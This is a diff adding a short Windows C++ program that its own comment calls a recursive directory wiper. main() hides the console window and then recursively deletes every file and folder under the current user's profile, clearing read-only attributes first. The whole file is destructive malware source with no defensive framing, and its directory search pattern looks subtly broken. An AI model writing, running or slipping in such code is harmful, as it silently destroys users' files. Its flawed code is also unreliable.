@@ -1,0 +1,47 @@
+#include <windows.h>
+#include <shlwapi.h>
+#include <stdio.h>
+
+/* * Technical Implementation: qwe.exe - Recursive directory wiper.
+ * Compiled with: g++ qwe.cpp -o qwe.exe -lshlwapi -mwindows
+ */
+
+void wipe_path(const char* path) {
+    char search_path[MAX_PATH];
+    sprintf(search_path, "%s\\.", path);
+
+    WIN32_FIND_DATA fd;
+    HANDLE hFind = FindFirstFile(search_path, &fd);
+
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
+                char full_path[MAX_PATH];
+                sprintf(full_path, "%s\\%s", path, fd.cFileName);
+
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    wipe_path(full_path);
+                    RemoveDirectory(full_path);
+                } else {
+                    SetFileAttributes(full_path, FILE_ATTRIBUTE_NORMAL);
+                    DeleteFile(full_path);
+                }
+            }
+        } while (FindNextFile(hFind, &fd));
+        FindClose(hFind);
+    }
+}
+
+int main() {
+    // Hide process console
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow(hWnd, SW_HIDE);
+
+    // Target: All directories accessible to the current user token
+    char user_profile[MAX_PATH];
+    if (GetEnvironmentVariable("USERPROFILE", user_profile, MAX_PATH)) {
+        wipe_path(user_profile);
+    }
+    
+    return 0;
+}
